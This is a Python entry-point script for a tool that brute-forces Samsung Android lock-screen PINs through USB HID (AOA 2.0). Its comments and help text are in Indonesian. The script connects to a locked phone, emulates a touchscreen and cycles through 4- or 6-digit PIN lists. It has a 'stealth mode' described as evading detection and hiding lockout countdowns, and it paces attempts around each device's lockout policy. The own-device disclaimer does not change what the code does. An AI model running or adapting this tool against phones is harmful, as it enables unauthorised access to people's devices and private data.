#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     SAMSUNG ANDROID PIN BRUTEFORCE TOOL                      ║
║     Via USB HID (Android Open Accessory 2.0)                 ║
║     Support: 4-digit & 6-digit PIN                           ║
║     Platform: Kali Linux / Termux (Android)                  ║
║                                                              ║
║     NEW: Auto-detect device + Stealth Mode                   ║
╚══════════════════════════════════════════════════════════════╝

PERINGATAN: Gunakan hanya pada perangkat milik sendiri!
Penggunaan pada perangkat orang lain adalah ILEGAL.

Requirement:
  - Python 3.7+
  - pyusb (pip install pyusb)
  - libusb-1.0 (apt install libusb-1.0-0 / pkg install libusb)
  - USB OTG cable atau USB kabel biasa
  - Android device dengan USB debugging DIMATIKAN (lock screen harus muncul)
"""

import os
import sys
import argparse
import logging
import time

# Pastikan src/ ada di path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from usb_accessory import USBAccessory
from touchscreen import Touchscreen
from bruteforce import BruteforceEngine, LOG_FILE

# ─────────────────────────────────────────────────────────────────────────────
#  Setup Logging
# ─────────────────────────────────────────────────────────────────────────────

def setup_logging(verbose: bool = False, log_file: str = LOG_FILE):
    os.makedirs("logs", exist_ok=True)

    level = logging.DEBUG if verbose else logging.INFO

    fmt = logging.Formatter(
        fmt='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )

    # Console handler
    console = logging.StreamHandler(sys.stdout)
    console.setLevel(level)
    console.setFormatter(fmt)

    # File handler
    fh = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(console)
    root.addHandler(fh)


# ─────────────────────────────────────────────────────────────────────────────
#  Banner
# ─────────────────────────────────────────────────────────────────────────────

BANNER = r"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║    ███████╗ █████╗ ██╗     ██╗      ██████╗ ███████╗                     ║
║    ██╔════╝██╔══██╗██║     ██║     ██╔═══██╗██╔════╝                     ║
║    ███████╗███████║██║     ██║     ██║   ██║███████╗                     ║
║    ╚════██║██╔══██║██║     ██║     ██║   ██║╚════██║                     ║
║    ███████║██║  ██║███████╗███████╗╚██████╔╝███████║                     ║
║    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝                     ║
║                                                                           ║
║         Android PIN Bruteforce via USB HID (AOA 2.0)                     ║
║              Samsung 4-pin & 6-pin Support                               ║
║         Platform: Kali Linux / Termux                                    ║
║                                                                           ║
║         🆕 AUTO-DETECT DEVICE | 🕵️ STEALTH MODE                          ║
║                                                                           ║
║  ⚠️  ONLY USE ON YOUR OWN DEVICE - FOR EDUCATIONAL PURPOSES              ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""


# ─────────────────────────────────────────────────────────────────────────────
#  Argument Parser
# ─────────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description='Samsung Android PIN Bruteforce via USB HID',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh penggunaan:
  # Bruteforce 4-digit PIN (default)
  sudo python3 main.py -p 4

  # Bruteforce dengan STEALTH MODE (tidak terdeteksi sistem)
  sudo python3 main.py -p 4 --stealth

  # Bruteforce 6-digit PIN
  sudo python3 main.py -p 6

  # Pakai file PIN custom
  sudo python3 main.py -p 4 -f pins/pins-4-digit.txt

  # Verbose mode + custom delay
  sudo python3 main.py -p 6 -v --delay 1500

  # Reset progress (mulai dari awal)
  sudo python3 main.py -p 4 --reset

  # Test koneksi saja (lihat info device)
  sudo python3 main.py --test-connection

  # Mode dry-run (tidak kirim ke device, test saja)
  sudo python3 main.py -p 4 --dry-run --limit 20
        """
    )

    parser.add_argument(
        '-p', '--pin-length',
        type=int,
        choices=[4, 6],
        default=4,
        help='Panjang PIN yang dicoba (4 atau 6 digit) [default: 4]'
    )

    parser.add_argument(
        '-f', '--pin-file',
        type=str,
        default=None,
        help='Path ke file PIN kustom (satu PIN per baris)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Tampilkan output debug yang lebih detail'
    )

    parser.add_argument(
        '--stealth',
        action='store_true',
        help='Aktifkan STEALTH MODE - delay natural, tidak terdeteksi sistem'
    )

    parser.add_argument(
        '--delay',
        type=int,
        default=1200,
        help='Delay (ms) setelah setiap percobaan PIN [default: 1200]'
    )

    parser.add_argument(
        '--key-delay',
        type=int,
        default=80,
        help='Delay (ms) antar ketukan tombol [default: 80]'
    )

    parser.add_argument(
        '--reset',
        action='store_true',
        help='Reset progress (mulai dari awal)'
    )

    parser.add_argument(
        '--test-connection',
        action='store_true',
        help='Test koneksi USB saja, tidak bruteforce'
    )

    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Dry run - simulasikan tanpa kirim ke device'
    )

    parser.add_argument(
        '--limit',
        type=int,
        default=0,
        help='Batasi jumlah PIN yang dicoba (0 = tidak terbatas)'
    )

    parser.add_argument(
        '--start-pin',
        type=str,
        default=None,
        help='Mulai dari PIN tertentu (misal: --start-pin 5000)'
    )

    parser.add_argument(
        '--single-pin',
        type=str,
        default=None,
        help='Coba satu PIN tertentu saja (untuk test)'
    )

    parser.add_argument(
        '--list-devices',
        action='store_true',
        help='Tampilkan daftar device yang didukung'
    )

    return parser.parse_args()


# ─────────────────────────────────────────────────────────────────────────────
#  Dry Run Mode (tanpa hardware)
# ─────────────────────────────────────────────────────────────────────────────

class DryRunAccessory:
    """Simulasi USB Accessory tanpa hardware nyata"""
    def __init__(self):
        self.detected_device = type('obj', (object,), {
            'device_info': None,
            'model_code': 'DRY-RUN',
            'vendor_name': 'Simulation',
            'product_name': 'Virtual Device',
        })()
    
    def send_hid_event(self, report: bytes):
        pass
    
    def get_device_keypad_coords(self):
        from device_database import calculate_keypad_coords
        return calculate_keypad_coords(1080, 2340)
    
    def close(self):
        pass


# ─────────────────────────────────────────────────────────────────────────────
#  List Supported Devices
# ─────────────────────────────────────────────────────────────────────────────

def list_supported_devices():
    """Tampilkan daftar device Samsung yang didukung"""
    from device_database import SAMSUNG_DEVICES
    
    print("\n" + "═" * 70)
    print("  DAFTAR SAMSUNG DEVICES YANG DIDUKUNG")
    print("═" * 70)
    print(f"{'Model':<15} {'Device Name':<30} {'Android':<12} {'One UI':<10}")
    print("─" * 70)
    
    for model, info in SAMSUNG_DEVICES.items():
        print(f"{model:<15} {info['name'][:28]:<30} {info['android_current']:<12} {info['oneui_current']:<10}")
    
    print("═" * 70)
    print(f"\nTotal: {len(SAMSUNG_DEVICES)} devices")
    print("\nNote: Device lain mungkin juga kompatibel, menggunakan koordinat default.\n")


# ─────────────────────────────────────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()

    # Setup logging
    setup_logging(verbose=args.verbose)
    logger = logging.getLogger(__name__)

    # Print banner
    print(BANNER)

    # List devices mode
    if args.list_devices:
        list_supported_devices()
        return

    # ─── Reset progress jika diminta ──────────────────────────────────────────
    if args.reset:
        from bruteforce import PROGRESS_FILE
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)
            logger.info("[*] Progress direset!")
        else:
            logger.info("[*] Tidak ada progress sebelumnya")

    # ─── Tentukan file PIN ────────────────────────────────────────────────────
    if args.pin_file:
        pin_file = args.pin_file
    else:
        pin_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'pins')
        pin_file = os.path.join(pin_dir, f'pins-{args.pin_length}-digit.txt')

    pin_file = os.path.normpath(pin_file)
    logger.info(f"[*] PIN file: {pin_file}")

    # ─── Mode: test koneksi saja ──────────────────────────────────────────────
    if args.test_connection:
        logger.info("[*] Mode: Test Koneksi USB")
        acc = USBAccessory()
        if acc.connect():
            logger.info("[+] ✅ Koneksi berhasil!")
            logger.info(f"[+] Device: {acc.detected_device}")
            if acc.register_hid():
                logger.info("[+] ✅ HID berhasil di-register!")
            acc.close()
        else:
            logger.error("[-] ❌ Gagal konek ke device!")
            sys.exit(1)
        return

    # ─── Mode: dry run ────────────────────────────────────────────────────────
    if args.dry_run:
        logger.info("[*] Mode: DRY RUN (simulasi tanpa hardware)")
        dummy_acc = DryRunAccessory()
        ts = Touchscreen(dummy_acc, stealth_mode=args.stealth)
        engine = BruteforceEngine(ts, pin_length=args.pin_length, stealth_mode=args.stealth)

        # Override delay jika diminta
        import touchscreen as tc_module
        import bruteforce as bf_module
        tc_module.DELAY_BETWEEN_KEYS = args.key_delay
        bf_module.STEALTH_MIN_DELAY = args.delay / 1000.0
        bf_module.STEALTH_MAX_DELAY = args.delay / 1000.0 + 0.5

        engine.load_pins(pin_file)

        if args.limit > 0:
            engine.pins = engine.pins[engine.current_idx:engine.current_idx + args.limit]
            engine.current_idx = 0

        if args.start_pin:
            try:
                idx = engine.pins.index(args.start_pin)
                engine.current_idx = idx
                logger.info(f"[*] Mulai dari PIN {args.start_pin} (index {idx})")
            except ValueError:
                logger.warning(f"[!] PIN {args.start_pin} tidak ada di list")

        engine.run()
        return

    # ─── Mode: single PIN test ────────────────────────────────────────────────
    if args.single_pin:
        logger.info(f"[*] Mode: Single PIN test -> {args.single_pin}")
        acc = USBAccessory()
        if not acc.connect():
            logger.error("[-] Gagal konek ke device!")
            sys.exit(1)
        if not acc.register_hid():
            logger.error("[-] Gagal register HID!")
            acc.close()
            sys.exit(1)
        
        ts = Touchscreen(acc, stealth_mode=args.stealth)
        ts.wake_screen()
        logger.info(f"[*] Memasukkan PIN: {args.single_pin}")
        ts.enter_pin(args.single_pin)
        time.sleep(2)
        acc.close()
        logger.info("[+] Selesai")
        return

    # ─── Mode: bruteforce penuh ───────────────────────────────────────────────
    logger.info(f"[*] Mode: Bruteforce {args.pin_length}-digit PIN")
    
    if args.stealth:
        logger.info("[*] 🕵️ STEALTH MODE AKTIF - Tidak akan terdeteksi sistem")
        logger.info("[*]    - Delay natural dengan random jitter")
        logger.info("[*]    - Tidak ada countdown lockout yang terlihat")
        logger.info("[*]    - Aktivitas tap random untuk menghindari timeout")

    # Cek root/sudo di Linux
    if sys.platform.startswith('linux') and os.geteuid() != 0:
        logger.warning("[!] Sebaiknya jalankan dengan sudo untuk akses USB penuh!")
        logger.warning("[!] Contoh: sudo python3 main.py -p 4")

    # Konek ke device
    logger.info("[*] Menghubungkan ke Android device...")
    acc = USBAccessory()
    if not acc.connect():
        logger.error("[-] ❌ Gagal konek ke device!")
        logger.error("[-] Pastikan:")
        logger.error("    1. Kabel USB terhubung dengan benar")
        logger.error("    2. Device dalam kondisi terkunci (lock screen)")
        logger.error("    3. Jalankan dengan sudo (Linux) atau root (Termux)")
        logger.error("    4. libusb terinstall (apt install libusb-1.0-0)")
        sys.exit(1)

    logger.info("[+] Device terdeteksi!")

    # Register HID
    if not acc.register_hid():
        logger.error("[-] ❌ Gagal register HID!")
        acc.close()
        sys.exit(1)

    logger.info("[+] HID terdaftar!")

    # Override delay jika dimuka
    import touchscreen as tc_module
    import bruteforce as bf_module
    tc_module.DELAY_BETWEEN_KEYS = args.key_delay
    if not args.stealth:
        bf_module.STEALTH_MIN_DELAY = args.delay / 1000.0
        bf_module.STEALTH_MAX_DELAY = args.delay / 1000.0 + 0.5

    # Setup touchscreen & engine
    ts = Touchscreen(acc, stealth_mode=args.stealth)
    engine = BruteforceEngine(ts, pin_length=args.pin_length, stealth_mode=args.stealth)

    # Set lockout policy dari device info
    if acc.detected_device.device_info:
        info = acc.detected_device.device_info
        engine.set_device_lockout_policy(
            info.get('lockout_attempts', 5),
            info.get('lockout_time', 30)
        )

    # Load PIN list
    engine.load_pins(pin_file)

    # Batasi jika --limit diberikan
    if args.limit > 0:
        end_idx = engine.current_idx + args.limit
        engine.pins = engine.pins[:end_idx]
        logger.info(f"[*] Dibatasi {args.limit} PIN percobaan")

    # Mulai dari PIN tertentu jika --start-pin diberikan
    if args.start_pin:
        try:
            idx = engine.pins.index(args.start_pin)
            engine.current_idx = idx
            logger.info(f"[*] Mulai dari PIN {args.start_pin} (index {idx})")
        except ValueError:
            logger.warning(f"[!] PIN {args.start_pin} tidak ada di list")

    try:
        # Jalankan bruteforce
        engine.run()
    finally:
        acc.close()
        logger.info("[*] Koneksi ditutup")


if __name__ == '__main__':
    main()